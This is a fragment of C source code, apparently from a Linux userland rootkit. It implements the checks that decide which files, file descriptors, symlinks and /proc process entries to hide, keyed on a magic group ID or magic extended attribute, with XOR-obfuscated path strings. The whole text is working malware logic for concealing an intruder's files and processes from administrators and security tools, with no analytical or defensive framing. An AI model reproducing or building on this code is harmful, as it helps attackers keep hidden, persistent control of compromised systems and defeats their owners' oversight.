#ifdef USE_MAGIC_ATTR
int isaproc(const char *pathname){
    char *procdir = xordup(PROCPATH_PATTERN);
    if(!procdir) return 0;
    procdir[5] = '\0';
    int s = strncmp(procdir, pathname, 5);
    clean(procdir);
    if(s != 0) return 0;
    char *bname = strrchr(pathname, '/')+1;
    return bname && nameisproc(bname);
}
#endif

/* returns 0 if name has anything else but digits in it. */
int nameisproc(const char *name){
    const size_t namelen = strlen(name);
    size_t got = 0;
    u_short hasdigit[namelen];

    for(size_t i = 0; i < namelen; i++)
        hasdigit[i] = 0;

    get_digits_charset();
    for(size_t n = 0; n < namelen; n++)
        for(size_t i = 0; i < sizeof(buf_digits) - 1 && !hasdigit[n]; i++)
            hasdigit[n] = 1 ? buf_digits[i] == name[n] : 0;
    memset(buf_digits, 0, sizeof(buf_digits));

    for(size_t i = 0; i < namelen; i++)
        if(hasdigit[i]) ++got;

    return got == namelen;
}

int _hidden_path(const char *pathname, const short mode){
    if(pathname == NULL || !initmvbc())
        return 0;

#ifdef USE_MAGIC_ATTR
    if(!isaproc(pathname))
        return hidden_xattr(pathname, mvbc->magicattr);
#endif

    gid_t pathgid;
    if(mode == MODE_REG)
        pathgid = get_path_gid(pathname);
    else pathgid = get_path_gid64(pathname);
    return pathgid == mvbc->magicid;
}

int _f_hidden_path(int fd, const short mode){
    if(!initmvbc())
        return 0;

#ifdef USE_MAGIC_ATTR
    char *dname;
    int isproc;
    dname = gdirname(fd, NULL);
    if(!dname) return 0;
    isproc = isaproc(dname);
    clean(dname);
    if(!isproc)
        return hidden_fxattr(fd, mvbc->magicattr);
#endif

    gid_t pathgid;
    if(mode == MODE_REG)
        pathgid = get_fd_gid(fd);
    else pathgid = get_fd_gid64(fd);
    return pathgid == mvbc->magicid;
}

int _l_hidden_path(const char *pathname, const short mode){
    if(pathname == NULL || !initmvbc())
        return 0;

#ifdef USE_MAGIC_ATTR
    if(!isaproc(pathname))
        return hidden_lxattr(pathname, mvbc->magicattr);
#endif

    gid_t pathgid;
    if(mode == MODE_REG)
        pathgid = lget_path_gid(pathname);
    else pathgid = lget_path_gid64(pathname);
    return pathgid == mvbc->magicid;
}

int hidden_proc(const pid_t pid){
    char proc_path[64 + PID_MAXLEN];
    snprintf(proc_path, sizeof(proc_path)-1, "/proc/%d", pid);
    gid_t procgid = get_path_gid(proc_path);
    if(!initmvbc())
        return !idtaken(MAGIC_GID) && procgid == MAGIC_GID;    
    return procgid == mvbc->magicid;
}